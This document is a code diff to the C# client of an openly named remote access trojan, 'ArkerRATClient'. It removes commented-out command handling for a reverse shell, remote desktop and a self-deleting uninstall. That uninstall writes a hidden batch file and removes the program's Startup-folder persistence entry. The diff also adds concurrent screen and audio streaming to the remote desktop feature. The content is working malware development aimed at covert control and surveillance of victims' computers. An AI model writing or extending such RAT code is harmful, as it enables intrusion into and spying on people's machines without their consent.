@@ -84,84 +84,6 @@ namespace ArkerRATClient
                 }
         }
 
-        //public static async Task ReadData()
-        //{
-        //    try
-        //    {
-        //        while (!noConnection)
-        //        {
-        //            byte[] data = new byte[131072];
-        //            await serverStream.ReadAsync(data, 0, data.Length);
-        //            DecideCyberTool(Encoding.UTF8.GetString(data, 0, data.Length).Trim('\0'));
-        //            await serverStream.FlushAsync();
-        //        }
-        //    }
-        //    catch (Exception ex)
-        //    {
-        //        CloseConnection();
-        //    }
-        //}
-
-        //public static bool uninstallFix = false;
-        //private static async Task DecideCyberTool(string data)
-        //{
-        //    if (data.Contains("§ReverseShell§"))
-        //    {
-        //        ReverseShell.reverseCMDSession(data.Replace("§ReverseShell§", ""));
-        //    }
-
-        //    if (data.Contains("§RemoteDesktop§"))
-        //    {
-        //        string tempString = data.Replace("§RemoteDesktop§", "");
-        //        RemoteDesktop.data = tempString;
-        //        await RemoteDesktop.RemoteDesktopFunction();
-        //    }
-
-        //    if (data.Contains("§Ping§"))
-        //    {
-        //        await SendData("§PingStart§§PingEnd§");
-        //    }
-        //    //this bool will make it so that the client doesn't try to reconnect at Program.cs while it is uninstalling.
-        //    if (data.Contains("§Uninstall§"))
-        //    {
-        //        uninstallFix = true;
-        //        CloseConnection();
-
-        //        //DELETE EXE
-        //        string batchCommands = string.Empty;
-        //        string exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
-
-        //        batchCommands += "@ECHO OFF\n";                         // Do not show any output
-        //        batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
-        //        batchCommands += "echo j | del /F ";                    // Delete the executeable
-        //        batchCommands += AppDomain.CurrentDomain.FriendlyName + "\n";
-        //        batchCommands += "echo j | del deleteMyProgram.bat";    // Delete this bat file
-
-        //        File.WriteAllText("deleteMyProgram.bat", batchCommands);
-        //        ProcessStartInfo startInfo = new ProcessStartInfo("deleteMyProgram.bat");
-        //        startInfo.CreateNoWindow = true;
-        //        startInfo.UseShellExecute = false;
-        //        startInfo.FileName = "deleteMyProgram.bat";
-        //        Process.Start(startInfo);
-
-        //        File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + AppDomain.CurrentDomain.FriendlyName);
-
-        //        Environment.Exit(0);
-        //    }
-
-        //    if (data.Contains("§Disconnect§"))
-        //    {
-        //        CloseConnection();
-        //        Environment.Exit(0);
-        //    }
-
-        //    if (data.Contains("§Reconnect§"))
-        //    {
-        //        CloseConnection();
-        //    }
-        //}
-
-
         static string data = string.Empty;
         static private async void ReadData()
         {
@@ -232,10 +154,10 @@ namespace ArkerRATClient
                         else if (startDelimiter == "§RemoteDesktopStart§")
                         {
                             if(subString.Length == 0)
-                            {
-                               
-                                    RemoteDesktop.sendingFrames = true;
-                                    RemoteDesktop.StartScreenStreaming(9);
+                            {      
+                                   RemoteDesktop.sendingFrames= true;
+                                   Task.Run(()=> RemoteDesktop.StartScreenStreaming(9));
+                                   Task.Run(()=> RemoteDesktop.StartAudioStreaming());
                             }
                             else if (subString.Contains("§KI§"))
                             {
